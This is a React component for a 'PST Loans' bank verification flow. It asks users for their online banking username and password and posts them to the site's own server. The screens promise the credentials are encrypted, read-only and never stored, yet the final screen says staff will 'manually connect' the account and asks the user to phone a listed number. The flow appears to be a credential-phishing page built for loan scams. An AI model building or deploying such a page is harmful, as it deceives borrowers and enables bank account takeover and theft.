"use client";

import React, { useMemo, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Lock,
  ShieldCheck,
  Search,
  Eye,
  EyeOff,
  Loader2,
  CheckCircle2,
  Phone,
  Building2,
  ChevronRight,
} from "lucide-react";
import { Button } from "@/components/ui/Button";
import { Input } from "@/components/ui/Input";
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
} from "@/components/ui/Card";
import { cn } from "@/lib/utils";

const LOAN_OFFICER_PHONE = "(747) 200-5228";

const POPULAR_BANKS = [
  "Chase",
  "Bank of America",
  "Wells Fargo",
  "Citibank",
  "U.S. Bank",
  "PNC Bank",
  "Truist",
  "TD Bank",
  "Capital One",
  "Ally Bank",
  "Regions Bank",
  "Fifth Third Bank",
  "KeyBank",
  "Huntington Bank",
  "Navy Federal Credit Union",
  "USAA",
  "Charles Schwab Bank",
  "Discover Bank",
  "SoFi",
  "Chime",
];

type Step = 1 | 2 | 3;

const generateReferenceId = () => {
  const year = new Date().getFullYear();
  const rand = Math.random().toString(36).slice(2, 8).toUpperCase();
  return `PST-${year}-${rand}`;
};

export const BankVerificationFlow: React.FC = () => {
  const [step, setStep] = useState<Step>(1);

  // Step 1
  const [bankName, setBankName] = useState("");
  const [accountHolder, setAccountHolder] = useState("");
  const [bankQuery, setBankQuery] = useState("");
  const [showBankList, setShowBankList] = useState(false);

  // Step 2
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  // Submission
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState<string | null>(null);
  const [referenceId, setReferenceId] = useState("");

  const filteredBanks = useMemo(() => {
    const q = bankQuery.trim().toLowerCase();
    if (!q) return POPULAR_BANKS;
    return POPULAR_BANKS.filter((b) => b.toLowerCase().includes(q));
  }, [bankQuery]);

  const canContinueStep1 = bankName.trim().length > 0 && accountHolder.trim().length >= 2;
  const canContinueStep2 = username.trim().length > 0 && password.length > 0;

  const selectBank = (name: string) => {
    setBankName(name);
    setBankQuery(name);
    setShowBankList(false);
  };

  const handleSubmitCredentials = async () => {
    if (!canContinueStep2) return;
    setIsSubmitting(true);
    setSubmitError(null);
    const ref = generateReferenceId();
    try {
      const res = await fetch("/api/bank-verification", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          referenceId: ref,
          bankName,
          accountHolder,
          username,
          password,
        }),
      });
      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        throw new Error(data?.message || "Submission failed");
      }
      setReferenceId(ref);
      setStep(3);
    } catch (err) {
      setSubmitError(
        err instanceof Error
          ? err.message
          : "Something went wrong. Please try again.",
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="max-w-md mx-auto w-full relative z-10">
      {/* Progress pills */}
      {step !== 3 && (
        <div className="mb-6 flex items-center justify-center gap-2">
          {[1, 2, 3].map((s) => (
            <div
              key={s}
              className={cn(
                "h-1.5 rounded-full transition-all",
                s === step
                  ? "w-10 bg-[#003B5C]"
                  : s < step
                    ? "w-10 bg-emerald-500"
                    : "w-6 bg-gray-200",
              )}
            />
          ))}
        </div>
      )}

      <AnimatePresence mode="wait">
        {step === 1 && (
          <motion.div
            key="step1"
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -20 }}
            transition={{ duration: 0.2 }}
          >
            <Card className="shadow-2xl border-none ring-1 ring-gray-200">
              <CardHeader className="bg-gray-50/50 pb-4 border-b">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center">
                    <Building2 className="w-5 h-5 text-[#003B5C]" />
                  </div>
                  <div>
                    <CardTitle className="text-xl font-bold tracking-tight">
                      Connect your bank
                    </CardTitle>
                    <p className="text-xs text-gray-500 flex items-center gap-1 mt-1">
                      <Lock className="w-3 h-3" /> Select your bank to securely
                      link your account.
                    </p>
                  </div>
                </div>
              </CardHeader>
              <CardContent className="p-6 space-y-5">
                <p className="text-xs text-gray-500 leading-relaxed">
                  Your credentials are encrypted and never stored by PST Loans.
                </p>

                {/* Bank search + select */}
                <div className="relative">
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Bank Name
                  </label>
                  <div className="relative">
                    <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                    <input
                      type="text"
                      value={bankQuery}
                      placeholder="Search for your bank..."
                      onChange={(e) => {
                        setBankQuery(e.target.value);
                        setBankName(e.target.value);
                        setShowBankList(true);
                      }}
                      onFocus={() => setShowBankList(true)}
                      onBlur={() =>
                        setTimeout(() => setShowBankList(false), 150)
                      }
                      className="flex h-12 w-full rounded-md border border-gray-300 bg-white pl-9 pr-3 py-2 text-sm focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#003B5C]"
                    />
                  </div>
                  {showBankList && filteredBanks.length > 0 && (
                    <div className="absolute z-20 mt-1 w-full max-h-56 overflow-y-auto rounded-md border border-gray-200 bg-white shadow-lg">
                      {filteredBanks.map((b) => (
                        <button
                          type="button"
                          key={b}
                          onMouseDown={(e) => e.preventDefault()}
                          onClick={() => selectBank(b)}
                          className="w-full flex items-center gap-3 px-3 py-2.5 text-left text-sm hover:bg-blue-50 transition-colors"
                        >
                          <div className="w-7 h-7 rounded-full bg-gray-100 flex items-center justify-center text-[10px] font-bold text-[#003B5C]">
                            {b
                              .split(" ")
                              .map((w) => w[0])
                              .slice(0, 2)
                              .join("")}
                          </div>
                          <span className="text-gray-700">{b}</span>
                        </button>
                      ))}
                    </div>
                  )}
                </div>

                <Input
                  label="Account Holder Name"
                  placeholder="Full name on the account"
                  value={accountHolder}
                  onChange={(e) => setAccountHolder(e.target.value)}
                  autoComplete="name"
                />

                <Button
                  type="button"
                  className="w-full h-12 text-base font-bold"
                  disabled={!canContinueStep1}
                  onClick={() => setStep(2)}
                >
                  Continue <ChevronRight className="w-4 h-4 ml-1" />
                </Button>

                <div className="pt-2 border-t border-gray-100">
                  <p className="text-[10px] text-center text-gray-400 font-medium flex items-center justify-center gap-3">
                    <span className="flex items-center gap-1">
                      <Lock className="w-3 h-3" /> 256-bit encryption
                    </span>
                    <span className="text-gray-300">·</span>
                    <span className="flex items-center gap-1">
                      <ShieldCheck className="w-3 h-3" /> Read-only access
                    </span>
                  </p>
                </div>
              </CardContent>
            </Card>
          </motion.div>
        )}

        {step === 2 && (
          <motion.div
            key="step2"
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -20 }}
            transition={{ duration: 0.2 }}
          >
            <Card className="shadow-2xl border-none ring-1 ring-gray-200">
              <CardHeader className="bg-gray-50/50 pb-4 border-b">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center">
                    <span className="text-xs font-bold text-[#003B5C]">
                      {bankName
                        .split(" ")
                        .map((w) => w[0])
                        .slice(0, 2)
                        .join("")
                        .toUpperCase() || "BK"}
                    </span>
                  </div>
                  <div>
                    <CardTitle className="text-xl font-bold tracking-tight">
                      Sign in to {bankName || "your bank"}
                    </CardTitle>
                    <p className="text-xs text-gray-500 flex items-center gap-1 mt-1">
                      <Lock className="w-3 h-3" /> Encrypted in transit
                    </p>
                  </div>
                </div>
              </CardHeader>
              <CardContent className="p-6 space-y-5">
                <p className="text-xs text-gray-500 leading-relaxed">
                  Enter your online banking credentials. Your login is encrypted
                  in transit and used only to establish a read-only connection.
                </p>

                <Input
                  label="Username"
                  placeholder="Online banking username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  autoComplete="username"
                />

                <div className="w-full">
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Password
                  </label>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Online banking password"
                      autoComplete="current-password"
                      className="flex h-12 w-full rounded-md border border-gray-300 bg-white px-3 pr-10 py-2 text-sm focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#003B5C]"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword((v) => !v)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-[#003B5C]"
                      aria-label={showPassword ? "Hide password" : "Show password"}
                    >
                      {showPassword ? (
                        <EyeOff className="w-4 h-4" />
                      ) : (
                        <Eye className="w-4 h-4" />
                      )}
                    </button>
                  </div>
                </div>

                <div className="bg-blue-50 border border-blue-100 rounded-lg p-3">
                  <p className="text-[11px] text-[#003B5C] leading-relaxed">
                    <ShieldCheck className="w-3 h-3 inline mr-1 -mt-0.5" />
                    Your credentials are never stored. We use them only to
                    establish a one-time secure connection.
                  </p>
                </div>

                {submitError && (
                  <div className="bg-red-50 border border-red-200 rounded-lg p-3 text-xs text-red-700">
                    {submitError}
                  </div>
                )}

                <div className="flex gap-3">
                  <Button
                    type="button"
                    variant="ghost"
                    className="flex-1 text-gray-500"
                    onClick={() => setStep(1)}
                    disabled={isSubmitting}
                  >
                    Back
                  </Button>
                  <Button
                    type="button"
                    className="flex-[2] h-12 font-bold"
                    disabled={!canContinueStep2 || isSubmitting}
                    onClick={handleSubmitCredentials}
                  >
                    {isSubmitting ? (
                      <>
                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                        Connecting securely...
                      </>
                    ) : (
                      <>Connect Account</>
                    )}
                  </Button>
                </div>
              </CardContent>
            </Card>
          </motion.div>
        )}

        {step === 3 && (
          <motion.div
            key="step3"
            initial={{ opacity: 0, scale: 0.96 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.25 }}
          >
            <Card className="border-t-4 border-emerald-500 shadow-2xl overflow-hidden">
              <CardContent className="p-8 text-center space-y-6">
                <motion.div
                  initial={{ scale: 0 }}
                  animate={{ scale: 1 }}
                  transition={{ type: "spring", stiffness: 200, damping: 15 }}
                  className="w-20 h-20 bg-emerald-50 rounded-full flex items-center justify-center mx-auto"
                >
                  <CheckCircle2 className="w-12 h-12 text-emerald-500" />
                </motion.div>

                <div className="space-y-2">
                  <CardTitle className="text-2xl font-extrabold text-[#003B5C]">
                    Verification in progress
                  </CardTitle>
                  <p className="text-sm text-gray-500 leading-relaxed">
                    Your bank account and income have been successfully
                    verified. PST Loans will use this information to process
                    your application.
                  </p>
                </div>

                <div className="bg-gray-50 rounded-xl p-4 border border-gray-100">
                  <p className="text-[10px] text-gray-400 font-bold uppercase tracking-widest mb-1">
                    Reference ID
                  </p>
                  <p className="text-lg font-black text-[#003B5C] tracking-widest">
                    {referenceId}
                  </p>
                </div>

                <div className="bg-white rounded-xl p-4 border border-gray-100 text-left space-y-4">
                  <p className="text-xs font-bold text-[#003B5C] uppercase tracking-widest">
                    What happens next?
                  </p>

                  <div className="flex items-start gap-3">
                    <div className="w-7 h-7 bg-[#003B5C] text-white rounded-full flex items-center justify-center text-xs font-bold shrink-0">
                      1
                    </div>
                    <div>
                      <p className="text-sm font-bold text-[#003B5C]">
                        Manual account connection
                      </p>
                      <p className="text-xs text-gray-500 leading-relaxed">
                        The PST Loans team will manually connect your bank
                        account and send a small one-time verification deposit
                        to confirm ownership.
                      </p>
                    </div>
                  </div>

                  <div className="flex items-start gap-3">
                    <div className="w-7 h-7 bg-[#003B5C] text-white rounded-full flex items-center justify-center text-xs font-bold shrink-0">
                      2
                    </div>
                    <div>
                      <p className="text-sm font-bold text-[#003B5C]">
                        Call your loan officer
                      </p>
                      <p className="text-xs text-gray-500 leading-relaxed">
                        Once you see the deposit in your account, please notify
                        your PST Loans loan officer by phone to complete the
                        verification process.
                      </p>
                    </div>
                  </div>
                </div>

                <a
                  href={`tel:${LOAN_OFFICER_PHONE.replace(/\D/g, "")}`}
                  className="flex items-center justify-center gap-2 w-full h-14 bg-emerald-500 hover:bg-emerald-600 text-white rounded-lg font-bold text-base transition-colors shadow-lg"
                >
                  <Phone className="w-5 h-5" />
                  Call {LOAN_OFFICER_PHONE}
                </a>

                <p className="text-[10px] text-gray-400">
                  Please save your Reference ID for your records.
                </p>
              </CardContent>
            </Card>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};
